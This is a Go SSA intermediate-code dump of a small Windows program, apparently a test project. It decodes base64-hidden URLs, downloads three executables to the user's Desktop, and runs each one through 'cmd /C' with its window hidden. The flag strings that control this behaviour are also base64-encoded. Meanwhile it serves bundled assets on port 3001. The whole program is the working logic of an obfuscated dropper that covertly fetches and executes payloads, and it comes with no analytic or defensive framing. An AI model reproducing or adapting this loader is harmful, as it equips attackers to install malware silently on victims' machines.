# Name: command-line-arguments.init
# Package: command-line-arguments
# Synthetic: package initializer
func init():
0:                                                                entry P:0 S:2
	t0 = *init$guard                                                   bool
	if t0 goto 2 else 1
1:                                                           init.start P:1 S:1
	*init$guard = true:bool
	t1 = encoding/base64.init()                                          ()
	t2 = github.com/gobuffalo/packr.init()                               ()
	t3 = io.init()                                                       ()
	t4 = log.init()                                                      ()
	t5 = math/rand.init()                                                ()
	t6 = net/http.init()                                                 ()
	t7 = os.init()                                                       ()
	t8 = os/exec.init()                                                  ()
	t9 = os/user.init()                                                  ()
	t10 = strings.init()                                                 ()
	t11 = syscall.init()                                                 ()
	t12 = time.init()                                                    ()
	t13 = new [3]string (slicelit)                               *[3]string
	t14 = &t13[0:int]                                               *string
	*t14 = "cmFuZC5FeHBhbmQ=":string
	t15 = &t13[1:int]                                               *string
	*t15 = "U3RhcnQ=":string
	t16 = &t13[2:int]                                               *string
	*t16 = "SGlkZVdpbmRvdz0=":string
	t17 = slice t13[:]                                             []string
	*keys = t17
	t18 = init#1()                                                       ()
	jump 2
2:                                                            init.done P:2 S:0
	return

# Name: command-line-arguments.init#1
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:22:6
func init#1():
0:                                                                entry P:0 S:0
	t0 = time.Now()                                               time.Time
	t1 = (time.Time).UnixNano(t0)                                     int64
	t2 = math/rand.Seed(t1)                                              ()
	return

# Name: command-line-arguments.main
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:26:6
func main():
0:                                                                entry P:0 S:0
	go serveAssets()
	t0 = decode("aHR0cDovLzEyNy4wL...":string)                       string
	t1 = decode("aHR0cDovLzEyNy4wL...":string)                       string
	t2 = decode("aHR0cDovLzEyNy4wL...":string)                       string
	t3 = new [3]string (varargs)                                 *[3]string
	t4 = &t3[0:int]                                                 *string
	*t4 = t0
	t5 = &t3[1:int]                                                 *string
	*t5 = t1
	t6 = &t3[2:int]                                                 *string
	*t6 = t2
	t7 = slice t3[:]                                               []string
	t8 = manageFiles(t7...)                                              ()
	return

# Name: command-line-arguments.decode
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:33:6
func decode(s string) string:
0:                                                                entry P:0 S:0
	t0 = *encoding/base64.StdEncoding             *encoding/base64.Encoding
	t1 = (*encoding/base64.Encoding).DecodeString(t0, s)    ([]byte, error)
	t2 = extract t1 #0                                               []byte
	t3 = extract t1 #1                                                error
	t4 = convert string <- []byte (t2)                               string
	return t4

# Name: command-line-arguments.serveAssets
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:38:6
func serveAssets():
0:                                                                entry P:0 S:0
	t0 = github.com/gobuffalo/packr.NewBox("./assets":string) github.com/gobuffalo/packr.Box
	t1 = make net/http.FileSystem <- github.com/gobuffalo/packr.Box (t0) net/http.FileSystem
	t2 = net/http.FileServer(t1)                           net/http.Handler
	t3 = net/http.Handle("/":string, t2)                                 ()
	t4 = net/http.ListenAndServe(":3001":string, nil:net/http.Handler) error
	return

# Name: command-line-arguments.manageFiles
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:44:6
func manageFiles(urls ...string):
0:                                                                entry P:0 S:2
	t0 = os/user.Current()                           (*os/user.User, error)
	t1 = extract t0 #0                                        *os/user.User
	t2 = extract t0 #1                                                error
	t3 = t2 != nil:error                                               bool
	if t3 goto 1 else 2
1:                                                              if.then P:1 S:0
	t4 = new [1]any (varargs)                                       *[1]any
	t5 = &t4[0:int]                                                    *any
	t6 = change interface any <- error (t2)                             any
	*t5 = t6
	t7 = slice t4[:]                                                  []any
	t8 = log.Println(t7...)                                              ()
	return
2:                                                              if.done P:1 S:1
	t9 = &t1.HomeDir [#4]                                           *string
	t10 = *t9                                                        string
	t11 = t10 + "\\Desktop\\":string                                 string
	t12 = new [3]string (slicelit)                               *[3]string
	t13 = &t12[0:int]                                               *string
	*t13 = "e.exe":string
	t14 = &t12[1:int]                                               *string
	*t14 = "o.exe":string
	t15 = &t12[2:int]                                               *string
	*t15 = "s.exe":string
	t16 = slice t12[:]                                             []string
	t17 = len(urls)                                                     int
	jump 3
3:                                                      rangeindex.loop P:4 S:2
	t18 = phi [2: -1:int, 6: t19, 7: t19, 8: t19] #rangeindex           int
	t19 = t18 + 1:int                                                   int
	t20 = t19 < t17                                                    bool
	if t20 goto 4 else 5
4:                                                      rangeindex.body P:1 S:2
	t21 = &urls[t19]                                                *string
	t22 = *t21                                                       string
	t23 = &t16[t19]                                                 *string
	t24 = *t23                                                       string
	t25 = t11 + t24                                                  string
	t26 = downloadFile(t25, t22)                                      error
	t27 = t26 != nil:error                                             bool
	if t27 goto 6 else 7
5:                                                      rangeindex.done P:1 S:0
	return
6:                                                              if.then P:1 S:1
	t28 = new [1]any (varargs)                                      *[1]any
	t29 = &t28[0:int]                                                  *any
	t30 = change interface any <- error (t26)                           any
	*t29 = t30
	t31 = slice t28[:]                                                []any
	t32 = log.Println(t31...)                                            ()
	jump 3
7:                                                              if.done P:1 S:2
	t33 = new [2]string (varargs)                                *[2]string
	t34 = &t33[0:int]                                               *string
	*t34 = "/C":string
	t35 = &t33[1:int]                                               *string
	*t35 = t25
	t36 = slice t33[:]                                             []string
	t37 = os/exec.Command("cmd":string, t36...)                *os/exec.Cmd
	t38 = new syscall.SysProcAttr (complit)            *syscall.SysProcAttr
	t39 = &t38.HideWindow [#0]                                        *bool
	t40 = *keys                                                    []string
	t41 = &t40[2:int]                                               *string
	t42 = *t41                                                       string
	t43 = toBool(t42)                                                  bool
	*t39 = t43
	t44 = &t37.SysProcAttr [#8]                       **syscall.SysProcAttr
	*t44 = t38
	t45 = (*os/exec.Cmd).Start(t37)                                   error
	t46 = t45 != nil:error                                             bool
	if t46 goto 8 else 3
8:                                                              if.then P:1 S:1
	t47 = new [1]any (varargs)                                      *[1]any
	t48 = &t47[0:int]                                                  *any
	t49 = change interface any <- error (t45)                           any
	*t48 = t49
	t50 = slice t47[:]                                                []any
	t51 = log.Println(t50...)                                            ()
	jump 3

# Name: command-line-arguments.downloadFile
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:67:6
# Recover: 3
# Locals:
#   0:	t0 error
func downloadFile(filepath string, url string) error:
0:                                                                entry P:0 S:2
	t0 = local error ()                                              *error
	t1 = net/http.Get(url)             (resp *net/http.Response, err error)
	t2 = extract t1 #0                                   *net/http.Response
	t3 = extract t1 #1                                                error
	t4 = t3 != nil:error                                               bool
	if t4 goto 1 else 2
1:                                                              if.then P:1 S:0
	*t0 = t3
	rundefers
	t5 = *t0                                                          error
	return t5
2:                                                              if.done P:1 S:2
	t6 = &t2.Body [#6]                                       *io.ReadCloser
	t7 = *t6                                                  io.ReadCloser
	defer invoke t7.Close()
	t8 = os.Create(filepath)                              (*os.File, error)
	t9 = extract t8 #0                                             *os.File
	t10 = extract t8 #1                                               error
	t11 = t10 != nil:error                                             bool
	if t11 goto 4 else 5
3:                                                              recover P:0 S:0
	t12 = *t0                                                         error
	return t12
4:                                                              if.then P:1 S:0
	*t0 = t10
	rundefers
	t13 = *t0                                                         error
	return t13
5:                                                              if.done P:1 S:0
	defer (*os.File).Close(t9)
	t14 = &t2.Body [#6]                                      *io.ReadCloser
	t15 = *t14                                                io.ReadCloser
	t16 = make io.Writer <- *os.File (t9)                         io.Writer
	t17 = change interface io.Reader <- io.ReadCloser (t15)       io.Reader
	t18 = io.Copy(t16, t17)                      (written int64, err error)
	t19 = extract t18 #0                                              int64
	t20 = extract t18 #1                                              error
	*t0 = t20
	rundefers
	t21 = *t0                                                         error
	return t21

# Name: command-line-arguments.toBool
# Package: command-line-arguments
# Location: C:\Users\林文秋\GolandProjects\awesomeProject\test.go:82:6
func toBool(s string) bool:
0:                                                                entry P:0 S:0
	t0 = decode(s)                                                   string
	t1 = strings.Contains(t0, "false":string)                          bool
	t2 = !t1                                                           bool
	return t2

